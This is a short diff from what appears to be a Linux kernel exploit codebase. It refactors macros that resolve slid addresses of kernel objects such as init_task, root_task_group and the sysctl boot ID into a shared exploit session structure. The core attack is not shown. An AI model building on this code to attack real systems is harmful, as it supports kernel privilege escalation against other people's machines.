@@ -13,6 +13,7 @@
 #include "runtime_time.h"
 #include "memory/heap_context.h"
 #include "pi_race.h"
+#include "session/exploit_session.hpp"
 
 #define PAGE_SHIFT 12
 #define PAGE_SIZE (1UL << PAGE_SHIFT)
@@ -76,17 +77,17 @@
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
 #define SLIDE_NFULNL_LOGGER \
-  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_NFULNL_LOGGER_IMAGE)
+  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_NFULNL_LOGGER_IMAGE)
 #define SLIDE_LOGGERS_0_1 \
-  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_LOGGERS_0_1_IMAGE)
+  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_LOGGERS_0_1_IMAGE)
 #define SLIDE_RANDOM_BOOT_ID_DATA \
-  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
+  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
 #define SLIDE_INIT_TASK \
-  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_INIT_TASK_IMAGE)
+  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_INIT_TASK_IMAGE)
 #define SLIDE_ROOT_TASK_GROUP \
-  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_ROOT_TASK_GROUP_IMAGE)
+  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_ROOT_TASK_GROUP_IMAGE)
 #define SLIDE_SYSCTL_BOOTID \
-  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_SYSCTL_BOOTID_IMAGE)
+  resolved_addresses_data_alias(&g_exploit_session.addresses, SLIDE_SYSCTL_BOOTID_IMAGE)
 
 struct local_sched_attr {
     uint32_t size;
@@ -99,8 +100,6 @@ struct local_sched_attr {
     uint64_t sched_period;
 };
 
-extern ghostlock::memory::ResolvedAddresses &g_resolved_addresses;
-extern TargetProfile &g_target_profile;
 
 /* Measured direct-map end (defaults to the built-in bound). */
 extern uint64_t g_direct_map_end;
